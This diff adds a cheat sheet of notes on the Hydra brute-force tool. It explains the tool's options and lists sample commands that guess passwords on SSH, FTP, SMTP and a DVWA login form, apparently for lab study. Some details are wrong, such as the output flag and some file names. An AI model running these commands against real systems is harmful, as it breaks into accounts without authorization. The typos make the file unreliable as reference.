@@ -1,0 +1,40 @@
+#hydra does not have a native default wordlist, using the Rockyou list is suggested
+
+#example brute force crack on ftp server
+
+:: Params ::
+
+-t # = preform # tasks
+-l indicates a single username (use -L for a username list). NAME = try to log in with NAME
+-P indicates use the following password list. [filepath] = Try password
+- http-post-form indicates the type of form
+/dvwa/login-php is the login page URL
+
+- username is the form field where the username is entered
+^USER^ tells Hydra to use the username or list in the field
+password is the form field where the password is entered (it may be passwd, pass, etc.)
+^PASS^ tells Hydra to use the password list supplied
+Login indicates to Hydra the login failed message
+Login failed is the login failure message that the form returned
+-V is for verbose output showing every attempt
+
+#check for joe accounts by adding modifier -e s
+
+#to write found login+pass combinations to fiel, add modifier -0 [fileanme]
+
+:: Sintax :: hydra -L users.txt -P passwords.txt <host> <protocol|service>
+
+:: Samples ::
+
+- hydra 192.168.1.26 ssh2 -s 22 -P pass.txt -L users.txt -e ns -t 10
+
+- hydra -t 1 -l admin -P [path to password.lst] -vV [IPaddress] ftp
+- hydra -l ksanchez -P [path to wordlist] smtp://10.0.0.10
+- hydra -l ksanchez -e nsr [IP] ssh -V -f
+- hydra -l ksanchez -P /root/wordlist/rockyour.lst 10.0.0.10 ssh
+- hydra -L dict.txt -P wordlist.lst [IP] ssh
+- hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -w 10 -V
+
+
+
+http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/
